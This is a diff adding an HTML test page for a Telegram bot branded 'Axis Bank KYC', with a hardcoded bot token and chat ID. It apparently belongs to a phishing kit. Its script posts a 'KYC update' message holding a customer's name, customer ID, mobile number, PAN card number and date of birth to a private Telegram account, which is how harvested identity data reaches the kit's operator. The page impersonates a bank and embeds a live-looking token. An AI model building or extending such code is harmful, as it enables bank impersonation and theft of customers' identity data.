@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Bot Test</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; }
+        .container { max-width: 600px; margin: 0 auto; }
+        button { background: #8B1538; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
+        button:hover { background: #7a1230; }
+        .result { margin-top: 20px; padding: 10px; border-radius: 5px; }
+        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🤖 Telegram Bot Test for Axis Bank KYC</h1>
+        <p>Testing connection to your bot: @vikaskumar_8102</p>
+        <p>Chat ID: 7271452485</p>
+        
+        <button onclick="testTelegram()">Test Telegram Connection</button>
+        <button onclick="testKyc()">Test KYC Message</button>
+        
+        <div id="result"></div>
+    </div>
+
+    <script>
+        const botToken = '8519877001:AAFUU7sq1cR3L-Rcsp_p1tydU0SiG2zvbwk';
+        const chatId = '7271452485';
+
+        async function sendMessage(message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const payload = {
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'HTML'
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                });
+
+                const result = await response.json();
+                return response.ok;
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+
+        async function testTelegram() {
+            const resultDiv = document.getElementById('result');
+            resultDiv.innerHTML = '<div class="result">Testing connection...</div>';
+
+            const testMessage = `
+🔧 <b>TELEGRAM BOT TEST - AXIS BANK KYC</b>
+
+✅ <i>Bot is working correctly!</i>
+• <b>Chat ID:</b> <code>${chatId}</code>
+• <b>Username:</b> @vikaskumar_8102
+• <b>Test Time:</b> ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
+
+🏦 <i>Axis Bank Online KYC System</i>
+            `;
+
+            const success = await sendMessage(testMessage);
+            
+            if (success) {
+                resultDiv.innerHTML = '<div class="result success">✅ Test message sent successfully! Check your Telegram @vikaskumar_8102</div>';
+            } else {
+                resultDiv.innerHTML = '<div class="result error">❌ Failed to send message. Check console for details.</div>';
+            }
+        }
+
+        async function testKyc() {
+            const resultDiv = document.getElementById('result');
+            resultDiv.innerHTML = '<div class="result">Testing KYC message...</div>';
+
+            const kycMessage = `
+📝 <b>NEW KYC UPDATE - AXIS BANK</b>
+
+👤 <b>Customer Information:</b>
+• <b>Full Name:</b> <code>Test User</code>
+• <b>Customer ID:</b> <code>TEST123</code>
+• <b>Mobile Number:</b> <code>9876543210</code>
+• <b>PAN Card:</b> <code>ABCDE1234F</code>
+• <b>Date of Birth:</b> <code>01/01/1990</code>
+• <b>Timestamp:</b> ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
+
+🏦 <i>Axis Bank Online KYC System</i>
+⏰ ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
+👤 Sent to: <a href="https://t.me/vikaskumar_8102">@vikaskumar_8102</a>
+            `;
+
+            const success = await sendMessage(kycMessage);
+            
+            if (success) {
+                resultDiv.innerHTML = '<div class="result success">✅ KYC test message sent successfully! Check your Telegram @vikaskumar_8102</div>';
+            } else {
+                resultDiv.innerHTML = '<div class="result error">❌ Failed to send KYC message. Check console for details.</div>';
+            }
+        }
+    </script>
+</body>
+</html>
